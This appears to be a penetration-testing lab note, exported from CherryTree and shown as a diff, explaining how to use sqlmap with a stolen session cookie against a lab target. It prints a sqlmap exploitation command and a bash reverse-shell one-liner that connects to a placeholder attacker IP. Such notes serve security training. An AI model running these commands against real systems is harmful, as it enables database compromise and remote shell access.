@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>sql injection (sqlmap)</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>sql injection (sqlmap)</h1><br/>SQLmap is an open-source tool used in penetration testing to detect and exploit SQL<br />injection flaws. SQLmap automates the process of detecting and exploiting SQL<br />injection. SQL Injection attacks can take control of databases that utilize SQL.<br /><br />The sqlmap comes pre-installed with Parrot OS &amp; Kali Linux, however, you can install it through the<br />repository if you don&#39;t have it:<br /><br />sudo apt install sqlmap<br /><br /><a href=""><img src="images/35-1.png" alt="images/35-1.png" /></a><br /><br />We will provide the URL &amp; the cookie to the sqlmap in order for it to find vulnerability. The reason why we<br />have to provide a cookie is because of authentication:<br /><br /><br />To grab the cookie, we can intercept any request in Burp Suite &amp; get it from there,  OR  you can install a<br />great extension for your web browser called cookie-editor :<br /><br />The cookies in HTTP messages of requests are usually set the following way: [Found from cookie editor]<br /><br />PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1<br /><br />Knowing that, here&#39;s how our sqlmap syntax should look:<br /><br />sqlmap -u &#39;<a href="http://10.129.95.174/dashboard.php?search=any+query'">http://10.129.95.174/dashboard.php?search=any+query&#39;</a> --cookie=&quot;PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1&quot;<br /><br /><a href=""><img src="images/35-2.png" alt="images/35-2.png" /></a><br /><br />Note: We got the shell in sqlmap, however, it is not very stable &amp; interactive. To make it much stable, we will use the<br />following payload:<br />bash -c &quot;bash -i &gt;&amp; /dev/tcp/{your_IP}/443 0&gt;&amp;1&quot;<br /><br />This method is used to bring <strong>sqlmap</strong> shell into our netcat listener.<br /><br /></div>
+</body>
+</html>
